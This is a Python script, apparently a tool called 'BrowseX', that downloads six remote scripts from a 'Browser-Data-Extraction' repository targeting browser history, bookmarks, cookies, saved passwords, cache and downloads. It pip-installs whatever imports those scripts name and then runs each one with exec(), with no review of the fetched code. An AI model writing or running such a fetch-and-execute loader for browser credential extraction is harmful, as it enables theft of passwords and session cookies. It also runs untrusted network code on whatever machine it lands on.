import sys
import pyfiglet
import requests
import ast
import importlib
import subprocess

def download_script(script_url):
    try:
        response = requests.get(script_url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error downloading {script_url}: {e}")
        return None

def extract_imports(script_content):
    """
    Extracts all the imports from the script content.
    Returns a set of imports to avoid duplicates.
    """
    tree = ast.parse(script_content)
    imports = set()

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                imports.add(alias.name)
        elif isinstance(node, ast.ImportFrom):
            imports.add(node.module)

    return imports

def install_missing_imports(imports):
    """
    Checks for missing imports and installs them.
    """
    for imp in imports:
        try:
            importlib.import_module(imp)
        except ImportError:
            print(f"Installing missing package: {imp}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", imp])

def run_script(script_url):
    script_content = download_script(script_url)
    if script_content:
        try:
            exec(script_content, globals())
        except Exception as e:
            print(f"Error running the script from {script_url}: {e}")
    else:
        print(f"Failed to download script from {script_url}")

def run_all_scripts():
    scripts = [
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/history.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/bookmarks.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/cookies.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/passwords.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/cache.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/downloads.py"
    ]
    
    all_imports = set()

    # First, download all scripts and extract their imports
    for script in scripts:
        script_content = download_script(script)
        if script_content:
            imports = extract_imports(script_content)
            all_imports.update(imports)
        else:
            print(f"Failed to download script: {script}")

    # Print total imports
    print("Total imports:")
    for imp in sorted(all_imports):
        print(imp)

    # Install all missing imports before executing any scripts
    install_missing_imports(all_imports)

    # After all imports are installed, execute the scripts
    for script in scripts:
        run_script(script)
    
    print("\nAll scripts have been executed.")

def print_banner():
    banner = pyfiglet.figlet_format("BrowseX")
    print(banner)
    print("\n===============", "\nMade by Cr0mb", "\n===============")

def main():
    print_banner()
    run_all_scripts()

if __name__ == "__main__":
    main()
